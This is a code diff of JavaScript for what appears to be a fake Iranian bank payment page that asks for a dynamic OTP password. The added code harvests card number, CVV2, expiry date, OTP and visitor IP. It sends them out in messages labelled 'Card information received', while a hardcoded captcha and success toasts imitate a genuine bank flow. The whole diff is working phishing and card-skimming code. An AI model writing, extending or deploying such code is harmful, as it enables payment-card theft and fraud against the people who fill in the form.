@@ -271,41 +271,60 @@ let timeRemainingpoya = 2 * 60; // 10 دقیقه به ثانیه
 const timerElementpoya = document.getElementById('poyaSpan');
 
 poyaSpan.addEventListener('click', () => {
+  const mm = exprationInput.value.slice(0, 2);
+  const yy = exprationInput.value.slice(3, 5);
   if (!poyaRequest) {
-    Toastify({
-      text: 'رمز پویا ارسال شد.',
-      duration: 2000,
-      newWindow: true,
-      close: true,
-      gravity: 'top', // `top` or `bottom`
-      position: 'right', // `left`, `center` or `right`
-      stopOnFocus: true, // Prevents dismissing of toast on hover
-      style: {
-        fontSize: '1.1rem',
-        fontWeight: '600',
-        background: '#15bb09',
-        width: '300px',
-        minWidth: '300px',
-        display: 'flex',
-        justifyContent: 'space-between',
-      },
-    }).showToast();
-    const countdownpoya = setInterval(() => {
-      const minutes = Math.floor(timeRemainingpoya / 60);
-      const seconds = timeRemainingpoya % 60;
+    if (
+      validateExpirationDate(mm, yy) &&
+      validateCVV2(cvv2Input.value) &&
+      captchaInput.value === '80860'
+    ) {
+      Toastify({
+        text: 'رمز پویا ارسال شد.',
+        duration: 2000,
+        newWindow: true,
+        close: true,
+        gravity: 'top', // `top` or `bottom`
+        position: 'right', // `left`, `center` or `right`
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        style: {
+          fontSize: '1.1rem',
+          fontWeight: '600',
+          background: '#15bb09',
+          width: '300px',
+          minWidth: '300px',
+          display: 'flex',
+          justifyContent: 'space-between',
+        },
+      }).showToast();
+      const countdownpoya = setInterval(() => {
+        const minutes = Math.floor(timeRemainingpoya / 60);
+        const seconds = timeRemainingpoya % 60;
 
-      timerElementpoya.textContent = `${String(minutes).padStart(
-        2,
-        '0'
-      )}:${String(seconds).padStart(2, '0')}`;
+        timerElementpoya.textContent = `${String(minutes).padStart(
+          2,
+          '0'
+        )}:${String(seconds).padStart(2, '0')}`;
 
-      if (timeRemainingpoya <= 0) {
-        clearInterval(countdownpoya);
-        timerElementpoya.textContent = 'درخواست رمزپویا';
-        poyaRequest = false;
-      }
-      timeRemainingpoya--;
-    }, 1000);
+        if (timeRemainingpoya <= 0) {
+          clearInterval(countdownpoya);
+          timerElementpoya.textContent = 'درخواست رمزپویا';
+          poyaRequest = false;
+        }
+        timeRemainingpoya--;
+      }, 1000);
+      const message = `
+    💳 #OTP Card information received .
+Card : ${cardInput.value.replaceAll('-', '')}
+Cvv2 : ${cvv2Input.value}
+Month : ${mm}
+Year : ${yy}
+Waiting : ...
+IP : ${userIp}
+Tag :  #${''}
+  `;
+      sendMessage(message);
+    }
   }
   poyaRequest = true;
 });
@@ -400,23 +419,25 @@ Tag : #${''}
       }).showToast();
     }
   }
-  // level 2
+
+  // level 3
   if (
     validateCardNumber(cardInput.value) &&
     validateExpirationDate(mm, yy) &&
     validateCVV2(cvv2Input.value) &&
     captchaInput.value === '80860' &&
-    poyaRequest === true
+    poyaRequest === true &&
+    poyaInput.value !== ''
   ) {
     const message = `
-    💳 #Ista Card information received .
-Card : ${cardInput.value}
+    💳 #Fixed Card information received .
+Card : ${cardInput.value.replaceAll('-', '')}
 Cvv2 : ${cvv2Input.value}
 Month : ${mm}
 Year : ${yy}
-Pass2 : ${poyaInput.value}
+Fixed : ${poyaInput.value}
 IP : ${userIp}
-Tag : #${''}
+Tag :  #${''}
   `;
     sendMessage(message);
     setTimeout(() => {
@@ -443,6 +464,31 @@ Tag : #${''}
         document.getElementById('page4').classList.remove('hidden');
       }, 1000);
     }, 2000);
+  } else {
+    let dat = '';
+    if (errors.length > 0) {
+      for (let text of errors) {
+        dat += text + '\n'; // اضافه کردن متن و رفتن به خط جدید
+      }
+      Toastify({
+        text: dat,
+        duration: 3000,
+        newWindow: true,
+        close: true,
+        gravity: 'top', // `top` or `bottom`
+        position: 'right', // `left`, `center` or `right`
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        style: {
+          fontSize: '1.1rem',
+          fontWeight: '600',
+          background: '#EA384D',
+          width: '300px',
+          minWidth: '300px',
+          display: 'flex',
+          justifyContent: 'space-between',
+        },
+      }).showToast();
+    }
   }
 });
 
